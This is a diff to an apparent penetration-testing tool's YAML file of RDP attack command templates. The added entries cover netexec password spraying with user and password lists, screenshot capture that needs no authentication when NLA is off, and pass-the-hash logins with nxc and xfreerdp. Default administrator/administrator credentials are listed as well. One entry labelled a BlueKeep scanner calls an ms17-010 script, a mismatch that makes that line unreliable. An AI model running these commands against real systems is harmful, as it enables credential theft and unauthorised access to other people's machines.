@@ -24,10 +24,18 @@ commands:
     template: "nmap -p{PORT} --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info {IP}"
   - label: "BlueKeep scanner"
     template: "nmap -p{PORT} --script=rdp-vuln-ms17-010 {IP}"
-  - label: "crackmapexec RDP"
+  - label: "crackmapexec RDP (legacy)"
     template: "crackmapexec rdp {IP} -u users.txt -p passwords.txt"
+  - label: "netexec / nxc RDP spray"
+    template: "nxc rdp {IP} -u users.txt -p passwords.txt --continue-on-success"
+  - label: "netexec RDP screenshot (no auth needed if NLA off)"
+    template: "nxc rdp {IP} -u <user> -p <pass> --screenshot --screentime 5"
+  - label: "netexec RDP pass-the-hash"
+    template: "nxc rdp {IP} -u <user> -H <NT-hash>"
   - label: "xfreerdp connection"
     template: "xfreerdp /u:administrator /p:password /v:{IP}:{PORT}"
+  - label: "xfreerdp pass-the-hash (RestrictedAdmin)"
+    template: "xfreerdp /u:administrator /pth:<NT-hash> /v:{IP}:{PORT} /cert:ignore"
 default_creds:
   - username: administrator
     password: administrator
